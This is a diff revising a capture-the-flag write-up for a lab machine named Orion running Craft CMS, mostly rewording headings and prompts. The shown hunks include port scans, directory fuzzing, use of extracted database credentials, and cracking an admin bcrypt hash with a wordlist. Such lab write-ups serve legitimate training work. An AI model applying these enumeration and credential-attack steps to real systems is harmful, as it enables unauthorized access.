@@ -21,11 +21,11 @@ difficulty: Easy
 
 ### Port Scanning 
 
-As usual we start with port scanning to identify what services are running on the target .<br>
+I started with a full TCP scan to identify the services exposed by the target.
 first a simple port scan .
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Orion]
 └──╼ $ sudo nmap -p- --min-rate 1000 -T4 -oN scans/ports.nmap 10.129.244.146
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-30 22:02 +0100
 Warning: 10.129.244.146 giving up on port because retransmission cap hit (6).
@@ -42,7 +42,7 @@ Nmap done: 1 IP address (1 host up) scanned in 95.59 seconds
 Okay so we have only two open ports `ssh` and `http`.<br>
 Then a deeper scan .
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Orion]
 └──╼ $ sudo nmap -sC -sV -p 22,80 -oN scans/deepscan.nmap 10.129.244.146
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-30 22:10 +0100
 Nmap scan report for 10.129.244.146
@@ -62,11 +62,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 10.08 seconds
 ```
 Nice! On port 80 we got a redirect to  `http://orion.htb`.
-### Web enumeration 
+### Web Enumeration
 
-Let's first add the domain we found to the hosts file.
+I added the discovered domain to `/etc/hosts` before continuing with web enumeration.
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Orion]
 └──╼ $ echo "10.129.244.146 orion.htb" | sudo tee -a /etc/hosts
 ```
 Now let's visit it in the browser.
@@ -76,7 +76,7 @@ Now let's visit it in the browser.
 The website appears to be a custom implementation built using **Craft CMS**, a flexible and powerful content management system.<br><br>
 My next move was directory enumeration
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Orion]
 └──╼ $ ffuf -u http://orion.htb/FUZZ -w $SECLISTS/Discovery/Web-Content/raft-small-directories.txt
 
         /'___\  /'___\           /'___\
@@ -114,7 +114,9 @@ p5                      [Status: 200, Size: 12272, Words: 1076, Lines: 386, Dura
 :: Progress: [20115/20115] :: Job [1/1] :: 66 req/sec :: Duration: [0:24:38] :: Errors: 1 ::
 ```
 
-## Initial Foothold : Shell as www-data
+## Exploitation
+
+### Initial Foothold as `www-data`
 
 The most important endpoint discovered is `/admin`, while the P-prefixed entries appear to be garbage parameters that redirect to the index page.<br><br>
 
@@ -234,7 +236,9 @@ www-data@orion:~$
 ```
 Successfully extracted database credentials: `root:SuperSecureCraft123Pass!`<br>
 
-## Pivoting : Shell as adam
+## Lateral Movement
+
+### Shell as `adam`
 Checking the tables 
 ```bash
 www-data@orion:~$ mysql -h 127.0.0.1 -u root -p'SuperSecureCraft123Pass!' -e "use orion;show tables;"
@@ -320,10 +324,10 @@ admin:$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS
 ```
 Using John the Ripper with the RockYou wordlist, we attempt to crack the bcrypt hash
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Orion]
 └──╼ $ echo 'admin:$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS' > hash.txt
 
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Orion]
 └──╼ $ john hash --wordlist=$ROCKYOU
 Warning: detected hash type "bcrypt", but the string is also recognized as "bcrypt-opencl"
 Use the "--format=bcrypt-opencl" option to force loading these as that type instead
@@ -378,7 +382,7 @@ drwxrwxr-x 3 adam adam 4096 May 12 08:15 ..
 -rw-r--r-- 1 adam adam  799 Mar  6 09:43 keys.tags.pub
 ```
 
-The home directory has no remarkable files to check . Next, let's check what network services are available on the system:
+The home directory contained no useful files, so I enumerated locally listening services for another escalation path:
 
 ```bash
 adam@orion:~$ ss -tuln
